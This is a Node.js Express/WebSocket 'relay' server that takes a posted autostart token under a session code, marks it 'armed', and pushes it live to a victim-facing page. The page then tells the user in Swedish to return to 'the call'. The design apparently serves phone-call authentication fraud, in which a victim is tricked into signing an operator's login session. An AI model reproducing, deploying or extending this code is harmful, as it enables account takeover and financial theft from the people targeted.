const express = require("express");
const http = require("http");
const path = require("path");
const { WebSocketServer } = require("ws");

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: "/ws" });

app.use(express.json());

const sessions = new Map();

function get(code) {
    if (!sessions.has(code)) {
        sessions.set(code, { code: code, token: null, redirect: "", state: "idle", ts: Date.now() });
    }
    return sessions.get(code);
}

function broadcast(code, payload) {
    wss.clients.forEach(function (c) {
        if (c.code === code && c.readyState === 1) {
            try { c.send(JSON.stringify(payload)); } catch (e) {}
        }
    });
}

function handleToken(req, res) {
    const body = req.body || {};
    const code = body.code || req.query.code || "default";
    const token = body.token || body.autostarttoken || req.query.token || null;
    const redirect = body.redirect || req.query.redirect || "";
    const s = get(code);
    s.token = token;
    s.redirect = redirect;
    s.state = "armed";
    s.ts = Date.now();
    broadcast(code, { type: "token", token: s.token, redirect: s.redirect, state: "armed" });
    res.json({ ok: true, code: code });
}

app.post("/api/token", handleToken);
app.post("/api/push", handleToken);
app.post("/token", handleToken);
app.post("/push", handleToken);
app.post("/api/relay", handleToken);
app.post("/relay", handleToken);

app.post("/api/done", function (req, res) {
    const body = req.body || {};
    const code = body.code || req.query.code || "default";
    const s = get(code);
    s.state = "done";
    s.ts = Date.now();
    broadcast(code, { type: "done", state: "done" });
    res.json({ ok: true });
});

app.get("/api/signed", function (req, res) {
    const code = req.query.code || "default";
    const s = get(code);
    s.state = "signed";
    s.ts = Date.now();
    broadcast(code, { type: "signed", state: "signed" });
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send('<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="font-family:sans-serif;text-align:center;padding:40px"><h2>Klart</h2><p>Ga tillbaka till samtalet.</p></body></html>');
});

app.get("/api/session/:code/state", function (req, res) {
    const s = get(req.params.code);
    res.json({ code: s.code, state: s.state, token: s.token, redirect: s.redirect, ts: s.ts });
});

app.get("/k/:code", function (req, res) {
    res.sendFile(path.join(__dirname, "public", "k.html"));
});

app.get("/", function (req, res) {
    res.sendFile(path.join(__dirname, "public", "k.html"));
});

wss.on("connection", function (ws, req) {
    const u = new URL(req.url, "http://x");
    ws.code = u.searchParams.get("code") || "default";
    const s = get(ws.code);
    try {
        ws.send(JSON.stringify({ type: "state", token: s.token, redirect: s.redirect, state: s.state }));
    } catch (e) {}
    ws.on("message", function (m) {
        try {
            const d = JSON.parse(m.toString());
            if (d.type === "ping") ws.send(JSON.stringify({ type: "pong" }));
        } catch (e) {}
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, function () {
    console.log("relay pa :" + PORT);
});
